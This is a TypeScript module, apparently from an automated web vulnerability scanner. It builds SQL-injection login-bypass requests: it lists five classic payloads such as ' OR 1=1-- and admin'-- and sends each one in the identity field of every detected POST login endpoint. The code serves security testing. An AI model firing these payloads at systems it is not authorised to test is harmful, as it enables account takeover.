import type { Endpoint } from '../surface/endpoint.js';
import type { AttackRequest } from './attack-request.js';

/**
 * Classic inputs that reveal whether a login treats its identity field as data or splices it
 * into a query (F3.3). Short and well known; the authenticated-as oracle, not the string,
 * decides whether a session opened without the right credentials.
 */
export const SQL_LOGIN_PAYLOADS: readonly string[] = [
  "' OR 1=1--",
  "' OR '1'='1",
  "admin'--",
  "') OR ('1'='1",
  "' OR 1=1#",
];

const IDENTITY_KEYS = ['email', 'username', 'user', 'login'] as const;
const PASSWORD_KEYS = ['password', 'pass'] as const;
const PLACEHOLDER_PASSWORD = 'janus-not-the-password';

/** The field name a surface param stands for: `body.email` → `email`, `email` → `email`. */
const fieldOf = (param: string): string => param.split('.').pop() ?? param;

/** The field whose name is one of the wanted keys, or undefined; returns the bare field name. */
const fieldFor = (params: readonly string[], wanted: readonly string[]): string | undefined => {
  for (const param of params) {
    const field = fieldOf(param);
    if (wanted.includes(field.toLowerCase())) return field;
  }
  return undefined;
};

const hasRepeat = (params: readonly string[]): boolean =>
  params.some((param) => /repeat|confirm/i.test(fieldOf(param)));

/**
 * Login-bypass candidates (F3.3): for every endpoint that posts an identity field and a password
 * but no password-repeat (a login, not a registration), send each payload in the identity field
 * with a placeholder password, as an anonymous visitor. Derived from the surface map's body
 * params, no target specifics; the authenticated-as oracle decides which attempt opened a
 * session it should not have.
 */
export function loginBypassCandidates(endpoints: readonly Endpoint[]): AttackRequest[] {
  const candidates: AttackRequest[] = [];
  for (const endpoint of endpoints) {
    if (endpoint.method !== 'POST' || hasRepeat(endpoint.params)) continue;
    const identity = fieldFor(endpoint.params, IDENTITY_KEYS);
    const password = fieldFor(endpoint.params, PASSWORD_KEYS);
    if (identity === undefined || password === undefined) continue;
    for (const payload of SQL_LOGIN_PAYLOADS) {
      candidates.push({
        class: 'auth-bypass',
        as: 'anonymous',
        method: 'POST',
        path: endpoint.route,
        body: JSON.stringify({ [identity]: payload, [password]: PLACEHOLDER_PASSWORD }),
      });
    }
  }
  return candidates;
}
